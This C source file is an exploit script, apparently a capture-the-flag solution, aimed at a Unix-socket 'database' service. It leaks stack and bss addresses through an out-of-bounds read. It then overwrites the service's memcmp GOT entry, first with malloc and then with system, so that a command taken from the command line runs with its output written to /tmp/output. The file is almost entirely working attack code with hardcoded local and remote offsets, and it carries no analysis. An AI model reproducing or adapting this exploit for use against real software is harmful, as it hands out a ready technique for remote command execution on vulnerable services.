#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <string.h>
#include <zlib.h>

int sockfd;

long db_addr = 0x00007ffff7ff3000;
int local = 1;
long stack_addr = 0;

struct PackageContent {
    char action;
    char payload[255];
};

struct Package {
    long checksum;
    char header[5];
    struct PackageContent content;  
};

void initConnection() {
    char *socketName = "secretSock";
    struct sockaddr addr;

    // Create socket
    sockfd = socket(1, 1, 0);
    
    // Connect to socket
    memset(&addr, 0, sizeof(struct sockaddr));

    addr.sa_family = 1;
    strncpy(addr.sa_data+1, socketName, strlen(socketName));
    
    if (connect(sockfd, &addr, 0xd) == -1) {
        printf("Error on socket connect\n");
        exit(-1);       
    }   
}

void sendPackage(struct Package* pkg, struct PackageContent* answer, char action, char *payload, unsigned int len) {
    // Initialize package
    memset(pkg, 0, sizeof(struct Package));

    strcpy(pkg->header, "\x44\x41\x37\x37\x37");
    pkg->content.action = action;

    memcpy(pkg->content.payload, payload, len);

    // Create package checksum
    int res = adler32(0, 0, 0);
    pkg->checksum = adler32(res, (const char*)pkg, 0x10d);
    
    // Send to server
    write(sockfd, pkg, 0x10d);

    // Read server response
    memset(answer, 0, sizeof(struct PackageContent));
    read(sockfd, answer, 0x10d);
}

void setval(char *buffer, long offset, long value) {
    *(unsigned long*)(buffer+offset) = value;
}

void read_index(struct Package *pkg, struct PackageContent *answer, unsigned long idx) {
    char buffer[8] = {0};
    
    setval(buffer, 0, idx);
    sendPackage(pkg, answer, 3, buffer, 8);
}

void crash_service(struct Package *pkg, struct PackageContent *answer) {
    char buffer[256];
    memset(buffer, 0x41, 256);

    sendPackage(pkg, answer, 2, buffer, 256);
}

long get_from_offset(struct PackageContent *answer, long offset) {
    return *((long*)(answer->payload + offset));
}

void leak_bss(struct Package *pkg, struct PackageContent *answer) {
    read_index(pkg, answer, 0x603000/0x21);

    for(int i=0; i<200; i+=8) {
        printf("%p | ", (void*)get_from_offset(answer, i + 2));
    }
}

long leak_overwrite_address(struct Package *pkg, struct PackageContent* answer) {    
    read_index(pkg, answer, ((0x7ffff7bbe2f0 - db_addr) / 0x21)-1);

    for(int i=0; i<200; i+=8) {
        printf("%p | ", (void*)get_from_offset(answer, i));
    }   

    return get_from_offset(answer, 0x10);
}

void write_value(struct Package *pkg, struct PackageContent *answer, long address, long value, char *payload) {
    char buffer[256] = {0};

    memset(buffer, 0x20, 256);

    memcpy(buffer, payload, strlen(payload));           // Copy prefix payload into package

    setval(buffer, 32, stack_addr - 0x1c0 - db_addr);   // Offset to the value in our payload
    setval(buffer, 40, address);                        // Destination address
    setval(buffer, 58, value);                          // Value in payload

    puts(buffer);

    sendPackage(pkg, answer, 2, buffer, 256);
}


int main(int argc, char* argv[]) {
    struct Package pkg;
    struct PackageContent answer;
    long stack_addr_off;
   
    local = 0;
    
    if (local == 1) {
        // Local offsets
        db_addr = 0x00007ffff7ff4000;
        stack_addr_off = -4;
    }
    else {
        // Remote offsets
        db_addr = 0x00007ffff7ff3000;
        stack_addr_off = 0;
    }

    initConnection();    

    // Initialize database
    sendPackage(&pkg, &answer, 4,  NULL, 0);

    char buffer[256] = {0};
    
    // Leak stack address from vdso_getcpu
    read_index(&pkg, &answer, ((0x7ffff7bbe2f0 - db_addr) / 0x21)-1);

    stack_addr = get_from_offset(&answer, 0x10+stack_addr_off);
    
    printf("Stack addr: %p", (void*)stack_addr);

    // Overwrite memcmp with malloc
    printf("[+] Overwrite memcmp with malloc\n");
    memset(buffer, 0x41, 256);
    
    setval(buffer, 32, 0x7ffff7dd80f8 - db_addr); // Offset to pointer to malloc.plt in libz
    setval(buffer, 40, 0x603070);                 // memcmp got
    
    sendPackage(&pkg, &answer, 2, buffer, 256);

    // Overwrite addr pointer with a stack pointer
    printf("[+] Overwrite db pointer\n");
    memset(buffer, 0x41, 256);
    
    setval(buffer, 32, 0x7ffff7bbe2f0 - db_addr);  // Offset to vdso_getcpu
    setval(buffer, 40, 0x603108);                  // addr

    sendPackage(&pkg, &answer, 2, buffer, 256);

    db_addr = stack_addr;

    // Overwrite memcmp with system
    printf("[+] Execute command");
    long system = 0x7ffff785f480;

    char cmd[256] = {0};

    if (argc > 1) {
        sprintf(cmd, "%s > /tmp/output;#", argv[1]);    
    }
    
    write_value(&pkg, &answer, 0x603070, system, cmd);
}